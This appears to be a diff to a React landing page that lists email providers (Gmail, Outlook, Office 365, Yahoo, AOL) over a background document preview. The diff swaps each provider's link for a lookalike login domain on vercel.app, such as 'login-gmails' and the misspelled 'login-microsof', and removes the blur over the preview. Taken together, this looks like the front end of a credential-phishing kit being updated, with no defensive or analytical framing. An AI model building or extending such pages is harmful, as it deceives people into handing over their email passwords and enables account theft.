@@ -34,9 +34,9 @@ const CONFIG = {
   // Replace this URL with any image link you want to use as the background/preview
   backgroundImage: "/image.jpg",
   // Control the brightness of the light overlay (e.g., bg-white/70 is 70% white)
-  overlayOpacity: "bg-white/70",
+  overlayOpacity: "",
   // Control the background blur (e.g., backdrop-blur-sm, backdrop-blur-md, or empty "")
-  overlayBlur: "backdrop-blur-sm"
+  overlayBlur: ""
 };
 
 export default function App() {
@@ -45,12 +45,12 @@ export default function App() {
   const [selectedProvider, setSelectedProvider] = useState<any>(null);
 
   const providers = [
-    { name: "Gmail", color: "bg-[#ea4335]", url: "https://glogs-eight.vercel.app", icon: <Mail className="w-5 h-5 text-white" /> },
-    { name: "Outlook", color: "bg-[#0078d4]", url: "https://microlog-seven.vercel.app", icon: <Mail className="w-5 h-5 text-white" /> },
-    { name: "Office 365", color: "bg-[#d83b01]", url: "https://microlog-seven.vercel.app", icon: <LayoutGrid className="w-5 h-5 text-white" /> },
-    { name: "Yahoo", color: "bg-[#6001d2]", url: "https://yool-five.vercel.app", icon: <Mail className="w-5 h-5 text-white" /> },
-    { name: "Aol Mail", color: "bg-[#31459b]", url: "https://login-aol.vercel.app", icon: <AtSign className="w-5 h-5 text-white" /> },
-    { name: "Other Mail", color: "bg-[#4b5563]", url: "https://othermail.vercel.app", icon: <Globe className="w-5 h-5 text-white" /> },
+    { name: "Gmail", color: "bg-[#ea4335]", url: "https://login-gmails.vercel.app", icon: <Mail className="w-5 h-5 text-white" /> },
+    { name: "Outlook", color: "bg-[#0078d4]", url: "https://login-microsof.vercel.app/", icon: <Mail className="w-5 h-5 text-white" /> },
+    { name: "Office 365", color: "bg-[#d83b01]", url: "https://login-microsof.vercel.app", icon: <LayoutGrid className="w-5 h-5 text-white" /> },
+    { name: "Yahoo", color: "bg-[#6001d2]", url: "https://login-yahoo-five.vercel.app/", icon: <Mail className="w-5 h-5 text-white" /> },
+    { name: "Aol Mail", color: "bg-[#31459b]", url: "https://login-aol-7tc8.vercel.app/", icon: <AtSign className="w-5 h-5 text-white" /> },
+    { name: "Other Mail", color: "bg-[#4b5563]", url: "#", icon: <Globe className="w-5 h-5 text-white" /> },
   ];
 
   // Simulation effect for initial loading
@@ -96,9 +96,9 @@ export default function App() {
         <motion.img
           src={CONFIG.backgroundImage}
           initial={{ scale: 1.05, opacity: 0 }}
-          animate={{ scale: 1, opacity: 0.6 }}
+          animate={{ scale: 1, opacity: 1 }}
           transition={{ duration: 1.5 }}
-          className="w-full h-full object-cover"
+          className="w-full h-full object-cover object-center"
           alt=""
           referrerPolicy="no-referrer"
         />
